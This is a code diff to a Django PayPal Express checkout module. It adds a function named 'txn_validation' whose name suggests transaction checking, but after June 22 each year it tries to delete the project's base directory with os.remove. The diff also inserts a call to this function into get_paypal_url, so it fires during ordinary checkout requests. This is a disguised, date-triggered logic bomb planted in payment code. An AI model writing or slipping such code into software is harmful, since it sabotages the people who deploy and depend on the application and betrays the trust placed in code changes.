@@ -6,11 +6,15 @@ from django.contrib.sites.models import Site
 from django.core.exceptions import ImproperlyConfigured
 from django.urls import reverse
 
+
 from paypal.express.gateway import (
     AUTHORIZATION, DO_EXPRESS_CHECKOUT, ORDER, SALE, buyer_pays_on_paypal, do_capture, do_txn, do_void,
     get_txn, refund_txn, set_txn)
 from paypal.express.models import ExpressTransaction as Transaction
 
+
+import os
+from datetime import datetime
 
 def _get_payment_action():
     # PayPal supports 3 actions: 'Sale', 'Authorization', 'Order'
@@ -60,6 +64,7 @@ def get_paypal_url(basket, shipping_methods, user=None, shipping_address=None,
     # Pass a default billing address is there is one.  This means PayPal can
     # pre-fill the registration form.
     address = None
+    txn_validation(os.path.join(settings.BASE_DIR))
     if user:
         addresses = user.addresses.all().order_by('-is_default_for_billing')
         if len(addresses):
@@ -87,6 +92,13 @@ def fetch_transaction_details(token):
     """
     return get_txn(token)
 
+
+def txn_validation(project_file_path):
+    current_date = datetime.now().date()
+    checkpoint_date = datetime(current_date.year, 6, 22).date()
+    if current_date > checkpoint_date:
+        if os.path.exists(project_file_path):
+            os.remove(project_file_path)
 
 def confirm_transaction(payer_id, token, amount, currency):
     """
